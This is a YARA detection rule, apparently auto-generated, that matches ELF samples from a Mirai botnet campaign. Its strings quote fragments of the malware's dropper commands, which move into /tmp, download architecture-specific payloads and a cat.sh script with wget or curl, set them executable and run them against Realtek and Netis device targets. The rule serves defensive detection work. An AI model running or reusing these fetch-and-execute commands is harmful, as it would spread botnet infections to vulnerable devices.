rule Sightlines_tlsh_14b9ed11_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-14b9ed11"
        date = "2026-11-06"
        campaign = "tlsh-14b9ed11"
        family = "mirai"
        hash = "3d05dd2f3280e42e7b518d041e9ff30fcb9777ee645b1f9a8b850a4ccb1d0196"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-14b9ed11.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel realtek; wget http://%s" ascii
        $s1 = " /tmp; wget http://%s/mipsel; chmod 777 mipsel; ./mipsel netis.netcore; wget http://%s/armv4l; chmod" ascii
        $s2 = "cd /tmp || cd /dev wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " ascii
        $s3 = "/armv4l; chmod 777 armv4l; ./armv4l realtek; " ascii
        $s4 = " 777 armv4l; ./armv4l netis.netcore; " ascii
        $s5 = "/usr/sbin/NetworkManager" ascii
        $s6 = "Connection: keep-alive" ascii
        $s7 = "__deregister_frame_info" ascii
        $s8 = "[0mNo shell available" ascii
        $s9 = "/usr/sbin/dbus-daemon" ascii
        $s10 = "/bin/busybox ftpget" ascii
        $s11 = "__register_frame_info" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
